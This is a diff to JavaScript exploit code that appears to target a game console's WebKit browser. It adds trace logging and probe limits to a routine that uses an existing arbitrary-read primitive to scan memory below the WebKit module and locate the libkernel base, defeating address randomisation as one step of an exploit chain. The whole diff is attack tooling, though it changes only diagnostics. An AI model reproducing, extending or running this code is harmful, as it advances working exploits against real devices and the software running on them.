@@ -55,7 +55,8 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832a";
+const BUILD_ID = "rw-20250832b";
+const SS_HUNT_TRACE = "wk-hunt-trace";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -155,7 +156,7 @@ function clearPersistedLog() {
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
     if (lkQuiet) {
-        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE|GUESS|PSFREE|GOT|FIND|TRACE|MISS|EXT|CELL|FINISH|VERIFY|VOTE|MIN-WALK|RESOLVE)/.test(tag)) {
+        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE|GUESS|PSFREE|GOT|FIND|TRACE|MISS|EXT|CELL|FINISH|VERIFY|VOTE|MIN-WALK|RESOLVE|HUNT)/.test(tag)) {
             lines.push(line);
             if (lines.length > 40) lines.splice(0, lines.length - 40);
             renderOut();
@@ -2211,7 +2212,7 @@ function finishFindLkChunk(chunk) {
             crashLog.flushSync();
 
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Hunt lk = 8 probes below webkit (≤24 reads)");
+            mark("LK-HINT", "Hunt lk logs each probe — UNMAPPED=null OOM risk");
             mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
@@ -2368,6 +2369,29 @@ function finishHuntLkHit(chunk) {
     crashLog.flushSync();
 }
 
+function huntTracePush(line) {
+    try {
+        sessionStorage.setItem(SS_HUNT_TRACE, line);
+        const raw = sessionStorage.getItem(SS_HUNT_TRACE + "-log");
+        const arr = raw ? JSON.parse(raw) : [];
+        arr.push(line);
+        if (arr.length > 24) arr.splice(0, arr.length - 24);
+        sessionStorage.setItem(SS_HUNT_TRACE + "-log", JSON.stringify(arr));
+    } catch (_) { }
+}
+
+function huntProbePreLine(st) {
+    if (!st || !st.addrs || st.idx >= st.addrs.length) return null;
+    const c = st.addrs[st.idx];
+    return (st.idx + 1) + "/" + st.addrs.length + " " + c.hex + " " + c.why;
+}
+
+function huntProbePostLine(probe) {
+    if (!probe) return "";
+    return probe.n + "/" + probe.total + " " + probe.hex + " → " + probe.magic
+        + (probe.raw ? " (" + probe.raw + ")" : "");
+}
+
 async function runHuntLkBelow() {
     if (!ready || !window.p || huntLkAuto) return;
     const p = window.p;
@@ -2383,39 +2407,79 @@ async function runHuntLkBelow() {
     huntLkStage = "cand";
     busy = true;
     setUi();
-    mark("LK-HUNT", "webkit=" + webkitBase + " ≤24 reads build=" + BUILD_ID);
+    try { sessionStorage.removeItem(SS_HUNT_TRACE + "-log"); } catch (_) { }
+    mark("LK-HUNT", "webkit=" + webkitBase + " 8×1read build=" + BUILD_ID);
+    huntTracePush("START wk=" + webkitBase);
     renderOut();
+    crashLog.flushSync();
 
     let ticks = 0;
     try {
-        while (huntLkAuto && ticks++ < 24) {
+        while (huntLkAuto && ticks++ < 12) {
+            const pre = huntProbePreLine(huntLkState);
+            if (pre) {
+                mark("LK-HUNT-PROBE", pre);
+                huntTracePush("PROBE " + pre);
+                renderOut();
+                crashLog.flushSync();
+                await new Promise(function (r) { setTimeout(r, 32); });
+            }
+
             const chunk = huntLibkernelCandidatesChunk(p, webkitBase, off, huntLkState, {
-                readMax: 24,
+                readMax: 8,
             });
             huntLkState = chunk.state;
+
             if (chunk.phase === "cand-start") {
-                mark("LK-HUNT", "8 offsets below webkit (1 probe each)");
-            } else if (chunk.phase === "cand") {
-                state("Hunt lk " + (chunk.idx || 0) + "/8 reads=" + (chunk.reads || 0), "warn");
-            } else if (chunk.phase === "cand-budget") {
-                mark("LK-HUNT", "read budget " + chunk.reads + " — stop");
+                mark("LK-HUNT", "targets=" + chunk.total + " (UNMAPPED=null read, mapped=good)");
+                huntTracePush("TARGETS " + chunk.total);
+                renderOut();
+                crashLog.flushSync();
+                continue;
             }
+
+            if (chunk.probe) {
+                const post = huntProbePostLine(chunk.probe);
+                mark("LK-HUNT-READ", post);
+                huntTracePush("READ " + post);
+                renderOut();
+                crashLog.flushSync();
+            }
+
+            if (chunk.phase === "cand-budget") {
+                mark("LK-HUNT", "read budget " + chunk.reads + " — stop");
+                huntTracePush("BUDGET " + chunk.reads);
+            } else if (chunk.phase === "cand-null-cliff") {
+                mark("LK-HUNT", "null cliff after " + (chunk.nulls || 0) + " unmapped — stop");
+                huntTracePush("CLIFF nulls=" + (chunk.nulls || 0));
+            }
+
             if (chunk.done && chunk.ok) {
                 finishHuntLkHit(chunk);
                 return;
             }
+
             if (chunk.done) {
-                mark("LK-HUNT-MISS", "reads=" + (chunk.reads || 0)
-                    + " nulls=" + (chunk.nulls != null ? chunk.nulls : "?")
-                    + " — no SCE libkernel below webkit");
-                state("hunt miss — paste lk base manually", "bad");
+                let summary = "reads=" + (chunk.reads || 0) + " nulls=" + (chunk.nulls != null ? chunk.nulls : "?");
+                if (chunk.log && chunk.log.length) {
+                    const bits = [];
+                    for (let li = 0; li < chunk.log.length; li++) {
+                        const pr = chunk.log[li];
+                        bits.push(pr.why + "=" + pr.magic);
+                    }
+                    summary += " | " + bits.join(" ");
+                }
+                mark("LK-HUNT-MISS", summary);
+                huntTracePush("MISS " + summary);
+                state("hunt miss — see LK-HUNT-READ lines", "bad");
                 break;
             }
-            renderOut();
-            await new Promise(function (r) { setTimeout(r, 64); });
+
+            await new Promise(function (r) { setTimeout(r, 48); });
         }
     } catch (err) {
         mark("LK-HUNT-ERR", err.message || String(err));
+        huntTracePush("ERR " + (err.message || String(err)));
         state("hunt error", "bad");
     } finally {
         huntLkAuto = false;
